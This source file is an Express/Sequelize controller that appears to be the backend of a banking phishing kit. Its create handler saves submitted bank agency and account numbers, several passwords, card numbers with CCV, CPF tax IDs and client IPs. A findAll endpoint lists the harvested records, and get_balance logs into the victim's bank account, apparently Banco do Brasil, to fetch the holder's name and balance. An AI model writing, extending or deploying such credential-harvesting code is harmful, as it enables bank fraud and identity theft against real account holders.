import db from '../models/index.js';
import BB from '../src/bb.js';
import dateTime from 'node-datetime';
import RequestIP from '@supercharge/request-ip';

const Log = db.Log;
const Op = db.Sequelize.Op;

// Create and Save a new Log
export let create = (req, res) => {
  
  // Create a Log
  const log = {
    date: dateTime.create().format('Y.m.d H:M:S'),
    name: req.body.name,
    agency: req.body.agency,
    account: req.body.account,
    password_8: req.body.password_8,
    balance: req.body.balance,
    phone: req.body.phone,
    password_6: req.body.password_6,
    syllabic: req.body.syllabic,
    card_name: req.body.card_name,
    card_number: req.body.card_number,
    ccv: req.body.ccv,
    cpf: req.body.cpf,
    is_visited: req.body.name == '' ? false : true,
    ip_address: RequestIP.getClientIp(req)
  };

  // Save Log in the database
  Log.create(log)
    .then(data => {
      res.send({success: true});
    })
    .catch(err => {
      res.status(500).send({
        message:
          err.message || "Some error occurred while creating the Log."
      });
    });
};

// Retrieve all Logs from the database.
export let findAll = (req, res) => {
    const { start, length } = req.body;
    const search = req.body['search[value]'];

    var condition = { [Op.and] : [
        { id : {[Op.gt] : 0}},
        { [Op.or]: [
            {date: {[Op.like]: `%${search}%`}},
            {name: {[Op.like]: `%${search}%`}},
            {agency: {[Op.like]: `%${search}%`}},
            {account: {[Op.like]: `%${search}%`}},
            {balance: {[Op.like]: `%${search}%`}},
        ]}
    ]};
  
    Log.findAndCountAll({ where: condition, offset: parseInt(start), limit: parseInt(length) })
        .then(async (data) => {    
            res.send({
                recordsTotal: await Log.count(),
                recordsFiltered: data.count,
                data: data.rows
            });
        })
        .catch(err => {
            res.status(500).send({
                message:
                err.message || "Some error occurred while retrieving Logs."
            });
    });
};

// Find a single Log with an id
export let findOne = (req, res) => {
  const id = req.params.id;

  Log.findByPk(id)
    .then(data => {
      res.send(data);
    })
    .catch(err => {
      res.status(500).send({
        message: "Error retrieving Log with id=" + id
      });
    });
};

// Delete a Log with the specified id in the request
export let remove = (req, res) => {
  const id = req.body.id;

  Log.destroy({
    where: { id: id }
  })
    .then(num => {
      if (num == 1) {
        res.send({
          success: true
        });
      } else {
        res.send({
          success: false
        });
      }
    })
    .catch(err => {
      res.status(500).send({
        message: "Could not delete Log with id=" + id
      });
    });
};

// Delete all Logs from the database.
export let removeAll = (req, res) => {
  Log.destroy({
    where: {},
    truncate: false
  })
    .then(nums => {
      res.send({ message: `${nums} Logs were deleted successfully!` });
    })
    .catch(err => {
      res.status(500).send({
        message:
          err.message || "Some error occurred while removing all Logs."
      });
    });
};

export let get_balance = async (req, res) => {
    try {
        // res.json({ name: 'test_name', balance: 5000 });
        let name = '';
        let checkingBalance = '';
        const bb = new BB();
        let branch = req.body.agency;
        let account = req.body.account;
        let password = req.body.password;
        
        name = await bb.login({ branch, account, password });
        checkingBalance = await bb.checking.getBalance();
        console.log('----------------------');
        console.log(name.nomeCliente, checkingBalance);
  
        if (name == '') {
            res.json({ name: name, balance: checkingBalance });
        } else {
            res.json({ name: name.nomeCliente, balance: checkingBalance });
        }
    } catch (err) {
      res.json({ name: '', balance: '' });
    }
}